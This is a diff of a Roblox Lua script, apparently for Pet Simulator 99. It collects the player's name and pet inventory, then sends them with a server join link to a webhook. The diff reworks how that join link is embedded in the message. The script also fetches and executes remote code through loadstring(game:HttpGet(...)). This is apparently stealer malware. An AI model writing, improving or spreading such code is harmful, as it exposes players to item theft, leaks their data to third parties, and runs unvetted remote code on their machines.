@@ -75,11 +75,13 @@ local function deletemagic()
 
         local petDataContent = table.concat(petdata, ", ")  -- Join pet data with commas
 
+        local gameLink = "```lua\n" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")' .. "\n```"
+
         local contentMsg = {
             embeds = {
                 {
                     title = "***Bot Information***",
-                    description = string.format("```%s```", game.Players.LocalPlayer.Name),
+                    description = string.format("```%s```", game.Players.LocalPlayer.Name) .. "\n" .. gameLink,
                     color = 16777215,  -- White color in decimal
                     fields = {
                         {
@@ -90,9 +92,6 @@ local function deletemagic()
                 }
             }
         }
-
-        local gameLink = "```lua\n" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")' .. "\n```"
-        table.insert(contentMsg.embeds, {title = "***Game Link***", description = gameLink})
 
         request({
             Url = webhookURL,
@@ -114,8 +113,3 @@ getgenv().LoadSettings = {
     Example_Setting = Example_Value
 }
 loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
-
-
-
-
-
